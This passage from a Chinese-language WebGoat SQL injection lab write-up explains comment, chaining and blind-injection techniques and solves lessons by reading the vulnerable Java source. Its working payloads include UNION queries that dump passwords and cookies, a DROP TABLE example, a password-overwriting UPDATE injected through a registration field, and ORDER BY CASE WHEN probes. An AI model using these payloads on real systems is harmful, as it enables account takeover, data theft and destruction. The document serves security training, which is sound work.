<span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">user_data</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">last_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;{Smith&#39;</span><span class="p">;</span><span class="k">select</span><span class="w"> </span><span class="n">userid</span><span class="p">,</span><span class="n">user_name</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">first_name</span><span class="p">,</span><span class="n">password</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">last_name</span><span class="p">,</span><span class="n">cookie</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">cc_number</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="mi">0</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">user_system_data</span><span class="p">;</span><span class="w"> </span><span class="c1">--}&#39;</span>
</code></pre></div>
<ul>
<li><code>Union Query</code></li>
</ul>
<div class="highlight"><pre><span></span><code><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">From</span><span class="w"> </span><span class="n">user_data</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">last_name</span><span class="w"> </span><span class="o">=</span><span class="s1">&#39;{Smith&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="n">userid</span><span class="p">,</span><span class="n">user_name</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">first_name</span><span class="p">,</span><span class="n">password</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">last_name</span><span class="p">,</span><span class="n">cookie</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">cc_number</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="mi">0</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">user_system_data</span><span class="w"> </span><span class="c1">--}&#39;</span>
</code></pre></div>
<h5 id="special-characters"><code>Special Characters</code>，特殊字符</h5>
<div class="highlight"><pre><span></span><code><span class="cm">/* */</span><span class="w">    </span><span class="k">are</span><span class="w"> </span><span class="n">inline</span><span class="w"> </span><span class="n">comments</span><span class="err">，多行注释</span><span class="w"></span>
<span class="c1">-- , #   are line comments，单行注释</span>
<span class="n">Example</span><span class="p">:</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;admin&#39;</span><span class="w"> </span><span class="c1">--AND pass = &#39;pass&#39;</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><span class="p">;</span><span class="w">        </span><span class="n">allows</span><span class="w"> </span><span class="n">query</span><span class="w"> </span><span class="n">chaining</span><span class="err">，允许链式查询</span><span class="w"></span>
<span class="n">Example</span><span class="p">:</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="p">;</span><span class="w"> </span><span class="k">DROP</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">users</span><span class="p">;</span><span class="w"></span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><span class="s1">&#39;,+,||   allows string concatenation，字符串连接符</span>
<span class="s1">Char()   strings without quotes，绕过引号</span>
<span class="s1">Example: SELECT * FROM users WHERE name = &#39;</span><span class="o">+</span><span class="nb">char</span><span class="p">(</span><span class="mi">27</span><span class="p">)</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="w"></span>
</code></pre></div>
<p><code>Special Statements</code>，特殊语句</p>
<ul>
<li><code>Union</code></li>
<li><code>Joins</code></li>
</ul>
<p><code>Blind SQL Injection</code>，<code>SQL</code>盲注</p>
<ul>
<li><code>content-based</code>，基于内容的<code>SQL</code>盲注</li>
</ul>
<div class="highlight"><pre><span></span><code>原始URL：https://shop.example.com?article<span class="o">=</span><span class="m">4</span>
如果如下URL请求：https://shop.example.com?article<span class="o">=</span><span class="m">4</span> and <span class="nv">1</span><span class="o">=</span><span class="m">1</span>，与原始URL返回的结果完全一致，则可以判断该请求点存在SQL注入。进一步修改参数值，https://shop.example.com?article<span class="o">=</span><span class="m">4</span> and <span class="nv">1</span><span class="o">=</span><span class="m">2</span>，若结果为空，则进一步验证猜想正确
https://shop.example.com?article<span class="o">=</span><span class="m">4</span> AND substring<span class="o">(</span>database_version<span class="o">()</span>,1,1<span class="o">)</span> <span class="o">=</span> <span class="m">2</span>
</code></pre></div>
<ul>
<li><code>time-based</code>，基于时间的<code>SQL</code>盲注</li>
</ul>
<div class="highlight"><pre><span></span><code><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">shop</span><span class="p">.</span><span class="n">example</span><span class="p">.</span><span class="n">com</span><span class="o">?</span><span class="n">article</span><span class="o">=</span><span class="mi">4</span><span class="p">;</span><span class="n">sleep</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span><span class="w"> </span><span class="c1">--</span>
<span class="err">如果以上请求延时</span><span class="mi">10</span><span class="err">秒才收到响应数据，说明存在延时注入漏洞</span><span class="w"></span>
</code></pre></div>
<p>题目：<code>Goal: Can you login as Tom?</code></p>
<p><img alt="image-20221227130724302" src="C:/Users/robin/AppData/Roaming/Typora/typora-user-images/image-20221227130724302.png" /></p>
<p>题目给出两个请求窗口：登录<code>LOGIN</code>和注册<code>REGISTER</code>，目标是以<code>Tom</code>身份进行登录。经过注册尝试，发现<code>Tom</code>账户系统中已经存在，但是我们不知道<code>Tom</code>账户的密码。通过抓包，我们得到两个请求的接口地址分别为：</p>
<div class="highlight"><pre><span></span><code><span class="err">登录：POST /WebGoat/SqlInjectionAdvanced/challenge_Login</span>
<span class="err">注册：PUT /WebGoat/SqlInjectionAdvanced/challenge</span>
</code></pre></div>
<p>先看注册接口，找到源码中对应的文件和实现方法，如下：</p>
<div class="highlight"><pre><span></span><code><span class="nd">@PutMapping</span><span class="p">(</span><span class="s">&quot;/SqlInjectionAdvanced/challenge&quot;</span><span class="p">)</span><span class="w"></span>
<span class="c1">//assignment path is bounded to class so we use different http method :-)</span><span class="w"></span>
<span class="nd">@ResponseBody</span><span class="w"></span>
<span class="kd">public</span><span class="w"> </span><span class="n">AttackResult</span><span class="w"> </span><span class="nf">registerNewUser</span><span class="p">(</span><span class="nd">@RequestParam</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">username_reg</span><span class="p">,</span><span class="w"> </span><span class="nd">@RequestParam</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">email_reg</span><span class="p">,</span><span class="w"> </span><span class="nd">@RequestParam</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">password_reg</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">AttackResult</span><span class="w"> </span><span class="n">attackResult</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">checkArguments</span><span class="p">(</span><span class="n">username_reg</span><span class="p">,</span><span class="w"> </span><span class="n">email_reg</span><span class="p">,</span><span class="w"> </span><span class="n">password_reg</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">attackResult</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">(</span><span class="n">Connection</span><span class="w"> </span><span class="n">connection</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">dataSource</span><span class="p">.</span><span class="na">getConnection</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">checkUserQuery</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;select userid from sql_challenge_users where userid = &#39;&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">username_reg</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&quot;&#39;&quot;</span><span class="p">;</span><span class="w"></span>
<span class="w">            </span><span class="n">Statement</span><span class="w"> </span><span class="n">statement</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">connection</span><span class="p">.</span><span class="na">createStatement</span><span class="p">();</span><span class="w"></span>
<span class="w">            </span><span class="n">ResultSet</span><span class="w"> </span><span class="n">resultSet</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">statement</span><span class="p">.</span><span class="na">executeQuery</span><span class="p">(</span><span class="n">checkUserQuery</span><span class="p">);</span><span class="w"></span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">resultSet</span><span class="p">.</span><span class="na">next</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">username_reg</span><span class="p">.</span><span class="na">contains</span><span class="p">(</span><span class="s">&quot;tom&#39;&quot;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">                    </span><span class="n">attackResult</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">trackProgress</span><span class="p">(</span><span class="n">success</span><span class="p">().</span><span class="na">feedback</span><span class="p">(</span><span class="s">&quot;user.exists&quot;</span><span class="p">).</span><span class="na">build</span><span class="p">());</span><span class="w"></span>
<span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">                    </span><span class="n">attackResult</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">failed</span><span class="p">().</span><span class="na">feedback</span><span class="p">(</span><span class="s">&quot;user.exists&quot;</span><span class="p">).</span><span class="na">feedbackArgs</span><span class="p">(</span><span class="n">username_reg</span><span class="p">).</span><span class="na">build</span><span class="p">();</span><span class="w"></span>
<span class="w">                </span><span class="p">}</span><span class="w"></span>
<span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">                </span><span class="p">......</span><span class="w"></span>
<span class="w">            </span><span class="p">}</span><span class="w"></span>
<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">SQLException</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">            </span><span class="n">attackResult</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">failed</span><span class="p">().</span><span class="na">output</span><span class="p">(</span><span class="s">&quot;Something went wrong&quot;</span><span class="p">).</span><span class="na">build</span><span class="p">();</span><span class="w"></span>
<span class="w">        </span><span class="p">}</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">attackResult</span><span class="p">;</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div>
<p>我们发现<code>checkUserQuery</code>语句是将用户输入的内容直接拼接到<code>SQL</code>语句中，然后直接执行语句，显然此处存在<code>SQL</code>注入漏洞。具体怎么利用先放一边，我们再看看登录接口的实现代码：</p>
<div class="highlight"><pre><span></span><code><span class="nd">@PostMapping</span><span class="p">(</span><span class="s">&quot;/SqlInjectionAdvanced/challenge_Login&quot;</span><span class="p">)</span><span class="w"></span>
<span class="nd">@ResponseBody</span><span class="w"></span>
<span class="kd">public</span><span class="w"> </span><span class="n">AttackResult</span><span class="w"> </span><span class="nf">login</span><span class="p">(</span><span class="nd">@RequestParam</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">username_login</span><span class="p">,</span><span class="w"> </span><span class="nd">@RequestParam</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">password_login</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="k">try</span><span class="w"> </span><span class="p">(</span><span class="kd">var</span><span class="w"> </span><span class="n">connection</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">dataSource</span><span class="p">.</span><span class="na">getConnection</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="n">PreparedStatement</span><span class="w"> </span><span class="n">statement</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">connection</span><span class="p">.</span><span class="na">prepareStatement</span><span class="p">(</span><span class="s">&quot;select password from sql_challenge_users where userid = ? and password = ?&quot;</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="n">statement</span><span class="p">.</span><span class="na">setString</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">username_login</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="n">statement</span><span class="p">.</span><span class="na">setString</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="n">password_login</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="n">ResultSet</span><span class="w"> </span><span class="n">resultSet</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">statement</span><span class="p">.</span><span class="na">executeQuery</span><span class="p">();</span><span class="w"></span>

<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">resultSet</span><span class="p">.</span><span class="na">next</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="p">(</span><span class="s">&quot;tom&quot;</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="n">username_login</span><span class="p">))</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="n">trackProgress</span><span class="p">(</span><span class="n">success</span><span class="p">().</span><span class="na">build</span><span class="p">())</span><span class="w"></span>
<span class="w">                </span><span class="p">:</span><span class="w"> </span><span class="n">success</span><span class="p">().</span><span class="na">feedback</span><span class="p">(</span><span class="s">&quot;ResultsButNotTom&quot;</span><span class="p">).</span><span class="na">build</span><span class="p">();</span><span class="w"></span>
<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">failed</span><span class="p">().</span><span class="na">feedback</span><span class="p">(</span><span class="s">&quot;NoResultsMatched&quot;</span><span class="p">).</span><span class="na">build</span><span class="p">();</span><span class="w"></span>
<span class="w">        </span><span class="p">}</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div>
<p>可以看到登录接口这里采用了<code>PreparedStatement</code>预编译的方法，对输入数据参数化，可以有效防止<code>SQL</code>注入攻击。通过比对<code>userid</code>和<code>password</code>的值来判断是否允许登录。因此我们首先需要知道<code>tom</code>用户的<code>userid</code>，并通过注册接口的注入漏洞来修改<code>sql_challenge_users</code>表中<code>tom</code>用户的密码，知道这两个信息，我们就可以实现使用<code>tom</code>账户进行登录的目标了。</p>
<div class="highlight"><pre><span></span><code><span class="err">PUT /WebGoat/SqlInjectionAdvanced/challenge</span>

<span class="err">username_reg=aaa&#39;;update sql_challenge_users set password=&#39;123&#39; where username=&#39;tom&#39;;#+&amp;email_reg=abc%40tom.com&amp;password_reg=123456&amp;confirm_password_reg=123456</span>
</code></pre></div>
<p>执行的<code>SQL</code>语句如下：</p>
<div class="highlight"><pre><span></span><code><span class="k">select</span><span class="w"> </span><span class="n">userid</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">sql_challenge_users</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">userid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;aaa&#39;</span><span class="p">;</span><span class="k">update</span><span class="w"> </span><span class="n">sql_challenge_users</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="n">password</span><span class="o">=</span><span class="s1">&#39;123&#39;</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="s1">&#39;tom&#39;</span><span class="p">;</span><span class="o">#</span><span class="w"> </span><span class="err">&#39;</span><span class="w"></span>
</code></pre></div>
<p>目标是将<code>username=tom</code>的账户的<code>password</code>字段值修改为<code>123</code>。然后请求登录接口验证修改是否成功</p>
<div class="highlight"><pre><span></span><code><span class="err">POST /WebGoat/SqlInjectionAdvanced/challenge_Login </span>

<span class="err">username_login=tom&amp;password_login=123</span>
</code></pre></div>
<p>返回结果如下：</p>
<p><img alt="image-20221227134513595" src="https://raw.githubusercontent.com/robinoneway/ImageHost/master/img/image-20221227134513595.png" /></p>
<p>可见我们已经成功的以<code>tom</code>账户登录系统。</p>
<p>题目：<code>Try it! Writing safe code</code></p>
<div class="highlight"><pre><span></span><code><span class="n">Connection</span><span class="w"> </span><span class="n">conn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">DriverManager</span><span class="p">.</span><span class="na">getConnection</span><span class="p">(</span><span class="n">DBURL</span><span class="p">,</span><span class="w"> </span><span class="n">DBUSER</span><span class="p">,</span><span class="w"> </span><span class="n">DBPW</span><span class="p">);</span><span class="w"></span>
<span class="n">PreparedStatement</span><span class="w"> </span><span class="n">statement</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">conn</span><span class="p">.</span><span class="na">prepareStatement</span><span class="p">(</span><span class="s">&quot;SELECT status FROM users WHERE name= ? AND mail= ?&quot;</span><span class="p">);</span><span class="w"></span>
<span class="n">statement</span><span class="p">.</span><span class="na">setString</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">name</span><span class="p">);</span><span class="w"></span>
<span class="n">statement</span><span class="p">.</span><span class="na">setString</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="n">mail</span><span class="p">);</span><span class="w"></span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">Connection</span><span class="w"> </span><span class="n">conn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">DriverManager</span><span class="p">.</span><span class="na">getConnection</span><span class="p">(</span><span class="n">DBURL</span><span class="p">,</span><span class="w"> </span><span class="n">DBUSER</span><span class="p">,</span><span class="w"> </span><span class="n">DBPW</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="n">PreparedStatement</span><span class="w"> </span><span class="n">statement</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">conn</span><span class="p">.</span><span class="na">prepareStatement</span><span class="p">(</span><span class="s">&quot;SELECT * FROM users WHERE username = ?&quot;</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="n">statement</span><span class="p">.</span><span class="na">setString</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;smith&quot;</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="n">ResultSet</span><span class="w"> </span><span class="n">results</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">statement</span><span class="p">.</span><span class="na">executeQuery</span><span class="p">();</span><span class="w"></span>
<span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;Oops. Something went wrong!&quot;</span><span class="p">);</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div>
<p>题目：<code>Try to find the ip address of the webgoat-prd server</code>，获取<code>webgoat-prd</code>服务器的<code>IP</code>地址。且题目给出了<code>IP</code>部分信息：<code>xxx.130.219.202</code>，需要我们补全。</p>
<p><img alt="image-20221227164151669" src="https://raw.githubusercontent.com/robinoneway/ImageHost/master/img/image-20221227164151669.png" /></p>
<p>当我们点击表头时，表格数据会根据所点击的列进行排序。我们对排序请求进行抓包</p>
<div class="highlight"><pre><span></span><code><span class="err">GET /WebGoat/SqlInjectionMitigations/servers?column=ip</span>
</code></pre></div>
<p>根据接口地址找到对应的源码实现代码：</p>
<div class="highlight"><pre><span></span><code><span class="nd">@GetMapping</span><span class="p">(</span><span class="n">produces</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">MediaType</span><span class="p">.</span><span class="na">APPLICATION_JSON_VALUE</span><span class="p">)</span><span class="w"></span>
<span class="nd">@ResponseBody</span><span class="w"></span>
<span class="kd">public</span><span class="w"> </span><span class="n">List</span><span class="o">&lt;</span><span class="n">Server</span><span class="o">&gt;</span><span class="w"> </span><span class="nf">sort</span><span class="p">(</span><span class="nd">@RequestParam</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">column</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">List</span><span class="o">&lt;</span><span class="n">Server</span><span class="o">&gt;</span><span class="w"> </span><span class="n">servers</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ArrayList</span><span class="o">&lt;&gt;</span><span class="p">();</span><span class="w"></span>
<span class="w">    </span><span class="k">try</span><span class="w"> </span><span class="p">(</span><span class="n">Connection</span><span class="w"> </span><span class="n">connection</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">dataSource</span><span class="p">.</span><span class="na">getConnection</span><span class="p">();</span><span class="w"></span>
<span class="w">         </span><span class="n">PreparedStatement</span><span class="w"> </span><span class="n">preparedStatement</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">connection</span><span class="p">.</span><span class="na">prepareStatement</span><span class="p">(</span><span class="s">&quot;select id, hostname, ip, mac, status, description from servers  where status &lt;&gt; &#39;out of order&#39; order by &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">column</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="n">ResultSet</span><span class="w"> </span><span class="n">rs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">preparedStatement</span><span class="p">.</span><span class="na">executeQuery</span><span class="p">();</span><span class="w"></span>
<span class="w">        </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="n">rs</span><span class="p">.</span><span class="na">next</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">            </span><span class="n">Server</span><span class="w"> </span><span class="n">server</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Server</span><span class="p">(</span><span class="n">rs</span><span class="p">.</span><span class="na">getString</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span><span class="w"> </span><span class="n">rs</span><span class="p">.</span><span class="na">getString</span><span class="p">(</span><span class="mi">2</span><span class="p">),</span><span class="w"> </span><span class="n">rs</span><span class="p">.</span><span class="na">getString</span><span class="p">(</span><span class="mi">3</span><span class="p">),</span><span class="w"> </span><span class="n">rs</span><span class="p">.</span><span class="na">getString</span><span class="p">(</span><span class="mi">4</span><span class="p">),</span><span class="w"> </span><span class="n">rs</span><span class="p">.</span><span class="na">getString</span><span class="p">(</span><span class="mi">5</span><span class="p">),</span><span class="w"> </span><span class="n">rs</span><span class="p">.</span><span class="na">getString</span><span class="p">(</span><span class="mi">6</span><span class="p">));</span><span class="w"></span>
<span class="w">            </span><span class="n">servers</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">server</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="p">}</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">servers</span><span class="p">;</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div>
<p>发现<code>column</code>是通过字符串拼接到<code>SQL</code>语句中的，先尝试使用<code>Query chaining</code>注入来修改目标服务器的<code>status</code>，使其能被查询语句检出。构造<code>Payload</code>如下</p>
<div class="highlight"><pre><span></span><code><span class="err">GET /WebGoat/SqlInjectionMitigations/servers?column=ip;update servers set status=&#39;success&#39; where hostname=&#39;webgoat-prd&#39;;#</span>
</code></pre></div>
<p>直接返回<code>400 Bad Request</code>。此路不通，看来只能根据题目信息使用<code>Order BY CASE WHEN</code>子句进行注入了。</p>
<div class="highlight"><pre><span></span><code><span class="err">CASE WHEN 1=1 THEN ip ELSE mac</span>
<span class="err">column=CASE WHEN (convert(int,substring(ip,1,3))&gt;127) THEN ip ELSE mac</span>
</code></pre></div>
<p>先简单测试一下：<code>CASE+WHEN+TRUE+THEN+ip+ELSE+mac+END</code></p>
<div class="highlight"><pre><span></span><code><span class="p">[</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="nt">&quot;id&quot;</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2&quot;</span><span class="p">,</span><span class="w"></span>
<span class="w">  </span><span class="nt">&quot;hostname&quot;</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;webgoat-tst&quot;</span><span class="p">,</span><span class="w"></span>
<span class="w">  </span><span class="nt">&quot;ip&quot;</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;192.168.2.1&quot;</span><span class="p">,</span><span class="w"></span>
<span class="w">  </span><span class="nt">&quot;mac&quot;</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;EE:FF:33:44:AB:CD&quot;</span><span class="p">,</span><span class="w"></span>
<span class="w">  </span><span class="nt">&quot;status&quot;</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;online&quot;</span><span class="p">,</span><span class="w"></span>
<span class="w">  </span><span class="nt">&quot;description&quot;</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Test server&quot;</span><span class="w"></span>
<span class="p">},</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="nt">&quot;id&quot;</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;3&quot;</span><span class="p">,</span><span class="w"></span>
<span class="w">  </span><span class="nt">&quot;hostname&quot;</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;webgoat-acc&quot;</span><span class="p">,</span><span class="w"></span>
<span class="w">  </span><span class="nt">&quot;ip&quot;</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;192.168.3.3&quot;</span><span class="p">,</span><span class="w"></span>
<span class="w">  </span><span class="nt">&quot;mac&quot;</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;EF:12:FE:34:AA:CC&quot;</span><span class="p">,</span><span class="w"></span>
<span class="w">  </span><span class="nt">&quot;status&quot;</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;offline&quot;</span><span class="p">,</span><span class="w"></span>
<span class="w">  </span><span class="nt">&quot;description&quot;</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Acceptance server&quot;</span><span class="w"></span>
<span class="p">},</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="nt">&quot;id&quot;</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;1&quot;</span><span class="p">,</span><span class="w"></span>
<span class="w">  </span><span class="nt">&quot;hostname&quot;</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;webgoat-dev&quot;</span><span class="p">,</span><span class="w"></span>
<span class="w">  </span><span class="nt">&quot;ip&quot;</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;192.168.4.0&quot;</span><span class="p">,</span><span class="w"></span>
<span class="w">  </span><span class="nt">&quot;mac&quot;</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;AA:BB:11:22:CC:DD&quot;</span><span class="p">,</span><span class="w"></span>
<span class="w">  </span><span class="nt">&quot;status&quot;</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;online&quot;</span><span class="p">,</span><span class="w"></span>
<span class="w">  </span><span class="nt">&quot;description&quot;</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Development server&quot;</span><span class="w"></span>
<span class="p">},</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="nt">&quot;id&quot;</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;4&quot;</span><span class="p">,</span><span class="w"></span>
<span class="w">  </span><span class="nt">&quot;hostname&quot;</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;webgoat-pre-prod&quot;</span><span class="p">,</span><span class="w"></span>
